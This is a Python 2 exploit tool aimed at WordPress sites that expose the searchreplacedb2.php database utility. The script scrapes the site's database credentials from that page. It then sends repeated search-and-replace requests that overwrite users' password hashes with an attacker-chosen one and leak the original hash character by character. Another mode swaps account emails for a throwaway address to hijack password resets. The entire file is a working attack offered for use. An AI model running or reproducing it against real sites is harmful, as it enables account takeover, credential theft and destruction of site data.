#!/usr/bin/env python2
import urllib,urllib2
import optparse,sys
import time
import hashlib

FAST = False

class Target(object):
	"""The target to overwrite"""
	def __init__(self, url):
		self.ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./-_"
		self.ALPHABET = list(self.ALPHABET)
		self.ALPHABET.append("$1$")
		self.ALPHABET.append("10")
		self.iterations = 15
		self.url = self.sanitizeUrl(url)

	def replace(self,search,replace):
		values = {'host':self.db_host,
		'data':self.db_name,
		'user':self.db_user,
		'pass':self.db_pass,
		'char':self.db_char,
		'guid':0,
		'tables\x5B0\x5D':'wp_users'}

		values['srch'] = search
		values['rplc'] = replace

		data = urllib.urlencode(values)
		response = urllib2.urlopen(self.url+"?step=5",data)
		html = response.read()
		time.sleep(0.03)
		return html

	def attack_sequence(self,method):

		if method == "replace":
			self.PASSWORD_HASH = hashlib.md5(self.password).hexdigest()
			Target.info("Some data including old passwords will be \x1B[91mdestroyed\x1B[0m")
			Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
			try:
				time.sleep(10)
			except:
				Target.bad("User stopped attack. Leaving...")
				exit(0)
			if FAST:
				self.keep_user()
				self.attack_password()
				self.place_user()
			else:
				self.clean_pass()

		elif method == "reset":
			Target.good("Getting a new email")
			#### Get online throwaway
			self.throwaway = "throwaway@fake-email.com"
			self.throwaway_url = "http://fake-email-generator.com/throwaway"
			if not hasattr(self,"email"):
				self.bruteforce_email()
			else:
				self.replace_email()

	def bruteforce_email(self):
		Target.info("Current emails will be \x1B[91mdestroyed\x1B[0m")
		Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
		try:
			time.sleep(10)
		except:
			Target.bad("User stopped attack. Leaving...")
			exit(0)

		Target.good("Starting with "+str(self.iterations)+" iterations for domain")

		for x in self.ALPHABET:
			self.replace("@"+x,'@$')

		for x in range(0,self.iterations):
			Target.info(str(x+1)+"/"+str(self.iterations)+" on domain")
			for x in self.ALPHABET:
				self.replace("@$"+x,'@$')

		for x in self.ALPHABET:
			self.replace(x+"@",'$@')

		for x in range(0,self.iterations):
			Target.info(str(x+1)+"/"+str(self.iterations)+" on prefix")
			for x in self.ALPHABET:
				self.replace(x+"$@",'$@')

		Target.good("Placing '"+self.throwaway+"' as address")
		self.replace("$@$",self.throwaway)


	def replace_email(self):
		Target.good("Replacing "+self.email+" with "+self.throwaway)
		### Replace original email with the one we control
		self.replace(self.email,self.throwaway)

		Target.good("Asking for password reset")
		### Request a password reset on our throwaway email

		#Target.good("Look for a reset message at "+throwaway_url)

		#Target.good("Putting original email back ...")
		#self.replace(self.throwaway,self.email)


	def attack_password(self):
		Target.good("Spraying wp-tables")
		for x in range(0,len(self.ALPHABET)):
			if x == len(self.ALPHABET)/4:
				Target.good("25% done")
			elif x == len(self.ALPHABET)/2:
				Target.good("50% done")
			elif x == len(self.ALPHABET)/4*3:
				Target.good("75% done")
			self.replace(self.ALPHABET[x],'1')
		Target.good("Placing '"+self.password+"' as password")
		for x in reversed(range(15,35)):
			self.replace('1'*x,self.PASSWORD_HASH)

	def clean_pass(self):
		Target.good("Using the password-only replacement")
		Target.info("This is the cleanest, but longest method!")

		progress_width = 30
		sys.stdout.write("[%s]" % ("\x20" * progress_width))
		sys.stdout.flush()
		sys.stdout.write("\b" * (progress_width+1))
		sys.stdout.write("-")
		sys.stdout.flush()
		original_hash = "$P$B"
		for x in self.ALPHABET:
			html = self.replace("$P$B"+x,'$P$B$')
			if "<strong>0</strong> cells were changed" not in html:
				original_hash = original_hash+x
				break
			

		for y in range(0,29):
			sys.stdout.write("-")
			sys.stdout.flush()
			for x in self.ALPHABET:
				html = self.replace("$P$B$"+x,'$P$B$')
				if "<strong>0</strong> cells were changed" not in html:
					original_hash = original_hash+x
					break
		if len(original_hash) == 34:
			Target.good("We did it Reddit! Original hash was "+original_hash)
			
		self.replace("$P$B$",self.PASSWORD_HASH)
		sys.stdout.write("\n")
		Target.good("You can login with any user and password "+self.password)

	def keep_user(self):
		Target.good("Saving user '"+self.user+"'")
		self.replace(self.user,"$$$")

	def place_user(self):
		Target.good("Reverting username to '"+self.user+"'")
		self.replace("$$$",self.user)
		Target.good("You should be able to login using \x1B[32m"+self.user+":"+self.password+"\x1B[0m")

	def populate(self):
		Target.good("Getting info at "+self.url)
		values = {'loadwp':1}
		data = urllib.urlencode(values)
		response = ""
		try:
			response = urllib2.urlopen(self.url+"?step=2",data)
		except:
			Target.bad("Request error while trying to populate")
			exit(1)
		html = response.read()
		html = html.split('\n')
		for line in html:
			if line.find('name="host"') != -1:
				self.db_host = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_host+"\x1B[0m' as database host")
			if line.find('name="data"') != -1:
				self.db_name = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_name+"\x1B[0m' as database name")
			if line.find('name="user"') != -1:
				self.db_user = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_user+"\x1B[0m' as database user")
			if line.find('name="pass"') != -1:
				self.db_pass = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_pass+"\x1B[0m' as database password")
			if line.find('name="char"') != -1:
				self.db_char = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_char+"\x1B[0m' as charset")

	def sanitizeUrl(self,url):
		if "://" not in url: 
			url = "http://"+url
		if "searchreplacedb2.php" not in url:
			if url[len(url)-1] != "/":
				url = url+"/"
			url += "searchreplacedb2.php"
		return url

	@staticmethod
	def good(text):
		print "[\x1B[32m+\x1B[0m] "+text
	
	@staticmethod
	def bad(text):
		print "[\x1B[31m-\x1B[0m] "+text
	
	@staticmethod
	def info(text):
		print "[\x1B[33m!\x1B[0m] "+text

def main():
	known_methods = ["reset","replace"]
	user = False
	password = False

	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -m <method> -t <target_url> [-u -p -e]\n\n"+sys.argv[0]+" --help (for detailed help)\n~Mixbo (https://github.com/mixbo)")
	parser.add_option('-t',dest='target_url',type='string',help="The target's URL (ex: http://www.exemple.com/searchreplacedb2.php)")
	parser.add_option('-u',dest='target_user',type='string',help="The target's user you'll use")
	parser.add_option('-p',dest='target_password',type='string',help="The new password")
	parser.add_option('-e',dest='target_email',type='string',help="Email to replace for password reset")
	parser.add_option('--method',dest='method',type='string',help="Method used. Either 'reset' or 'replace")
	(options, args) = parser.parse_args()

	if not options.method:
		Target.bad(parser.usage)
		exit(1)
	elif options.method not in known_methods:
		Target.bad("Unknown method")
		exit(1)
	else:
		method = options.method

	if not options.target_url:
		Target.bad(parser.usage)
		exit(1)
	else:
		url = options.target_url

	Target.good("Creating a login pair for \x1B[32m"+url+"\x1B[0m")
	
	if method == "replace":
		if options.target_user:
			user = options.target_user
		else:
			Target.info("Using 'admin' because no user was provided")
			user = "admin"

		if options.target_password:
			password = options.target_password
		else:
			Target.info("Using 'password' because no password was provided")
			password = "password"


	t = Target(url)
	if options.target_email:
		t.email = options.target_email
	if user:
		t.user = user
	if password:
		t.password = password
	t.populate()
	t.attack_sequence(method)

if __name__ == "__main__":
	main()
